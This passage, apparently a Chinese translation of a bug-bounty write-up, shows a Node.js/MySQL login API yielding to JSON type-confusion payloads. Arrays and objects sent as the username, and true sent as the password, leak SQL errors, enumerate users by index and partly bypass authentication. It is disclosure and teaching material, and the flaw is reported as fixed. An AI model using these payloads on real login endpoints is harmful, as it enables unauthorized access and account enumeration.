    Content-Length: 83 
    ETag: W/”53-vxvZJPkaGgb/+r6gylAGG9yaeoE” 
    Date: Thu, 11 Oct 2018 18:50:26 GMT 
    Connection: close 
    {“result”:”User with login [bl4de] was not found.”,”resultCode”:401,”type”:”error”}
这个返回信息以为着我的用户名被返回进了square brackets。  
Square brackets在JavaScript中的意味着一个数组并且用户名看上去像数组中的元素。为了确定这一点，我发送另一个payload--一个空的数组
    {“username”:[],”password”:”secretpassword”}
服务器返回的报文就很让人感到惊喜了
    {“result”:”User with login [] was not found.”,”resultCode”:401,”type”:”error”}
一个空的数组？或者也许square brackets被当成了一个用户名所接受？  
ok，让我们试试在用户名的地方输入一个空对象，然后看看它到底发生了什么：
    {“username”:{},”password”:”secretpassword”}
对于这次请求返回的数据包就证实了我刚才对于用户名验证逻辑的猜想（它试图去调用{}.replace，但是对于JavaScript的对象来说，没有可以被替换的东西）
    {"result":"val.replace is not a function","resultCode":500,"type":"error"}
这看起来就像：我创建了一个空的对象（我用val代表这个对象）之后调用了一个replace()来作为一个函数。你会看到上面的那个报错很像下面代码的报错：
    let val = {}
    val.replace()
    VM188:1 Uncaught TypeError: val.replace is not a function
     at :1:5
# 利用
能够证实一个报错是一件事，但是能够成功利用它则是一个故事。我开始去想，服务器里面的代码是怎样运行的，为什么会报这样的错误，我在下一次的测试中用尽可能多的畸形代码去触发不同的报错。嵌套数组([[]])看起来很棒：
    {“username”:[[]],”password”:”secretpassword”}
服务器的相应甚至没有达到我的预期
    {"result":"ER_PARSE_ERROR: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') OR `Person`.`REDACTED_ID` IN ()) LIMIT 1' at line 1","resultCode":409,"type":"error"}
当看到类似于上面的报错，赏金猎人的脑中会想到什么？当然是sql注入啦。但是首先，我必须发现在查询中怎样使用用户名才能制作出正确payload，让MySQL服务器乖乖下跪。我在想，用户名被当成了一个数组元素，于是我发送了一个请求，里面的用户名就是数组的第一个元素([0])：
    {“username”:[0],”password”:”secretpassword”}
这时，应用返回了一个不一样的错误信息：
    {“result”:”User super.adm, Request {\”port\”:21110,\”path\”:\”/REDACTED? ApiKey=REDACTED\”,\”headers\”:{\”Authorization\”:\”Basic c3VwZXIuYWRtOnNlY3JldHBhc3N3b3Jk\”}, \”host\”:\”api-global.REDACTED\”}, Response {\”faultcode\”:\”ERR_ACCESS_DENIED\”,\”faultstring\”:\”User credentials are wrong or missing.\”, \”correlationId\”:\”Id-d5a9bf5b7ad73e0042191000924e3ca9\”}”,”resultCode”:401,”type”:”error”}
经过快速的分析，我发现我可以以某种方式去使用ID为0的用户（或者某个数据结构中索引为0的用户）然后我发送另一个请求（这次内部服务器监听的端口是21110？），这个请求很明显没有通过验证，原因是密码错误（你其实已经看到包含
Base64字符串`super.adm:secretpassword`
的Authorization头，这意味着应用已经使用了下标为0的用户，并且密码来自于我最早的请求）。  
下面我试图弄清楚是否我能用下标(1, 2
等)从数据库中枚举用户，然后我成功的发现了其他的两个用户。并且我发现我能传递任意数量的下标，作为登录请求中的用户名，它们会被放到查询语句中IN() ：
    {"username":[0,1,2,30,50,100],"password":"secretpassword"}
无论何时只要发现一个有效的下标，这个请求总是能给我返回一个有效的用户（我想--应用试图把请求发送给内部的API，通过数据库的sql查询语句去选择要使用的用户名）。但是我使用的密码总是错误的，所以我没有完全绕过身份验证。所以下面的挑战是寻找一种方法去绕过密码验证  
我仔细思考了一下这个JavaScript的应用，我用我能想到的最简单方式去测试：布尔 false：
    {“username”:[0],”password”:false}
这次服务器返回了不同的内容：
    {"result":"Please provide credentials","resultCode":500,"type":"error"}
在之前，我似乎没有看过这样的报错，但是我很快的证实，返回错误的原因是用户名或者密码缺失造成的。当我提供用户名时，服务器就去验证密码，而“password”:false意味着密码不存在。发送null和0（这些值在JavaScript的判断语句中都会被当成false)都会导致相同的错误
# 最后的poc
所以，如果密码是false时会导致失败的话，那么我就把密码换成true？
    {“username”:[0],”password”:true}
就是这样，使用数字的第一个元素([0]) 作为用户名并且true这个关键字被作为密码可以让我成功的绕过用户验证
    {"result":"Given pin is not valid.","resultCode":401,"type":"error"}
免责声明：这个绕过并不完全，并且也不允许我登录到这个应用，原因是这个验证过程还涉及到第三个因素：PIN码，它应该在登录之后输入。无论怎样，这个身份验证绕过的漏洞是有效的漏洞，并且现在已经被修复。  
利用sql注入是不可能的，因为输入的用户名和密码都经过了正则的表达式的检查，当我构造的payload中包含不被允许的特殊字符时，服务器就会返回语法错误。
# 致谢
我感谢这个公司和他们的安全团队成员的支持，感谢hackerone的漏洞赏金计划让我有机会去写这篇关于漏洞的文章  
以及，特别感谢我所在的安全小组成员为这份报告所提供的支持与反馈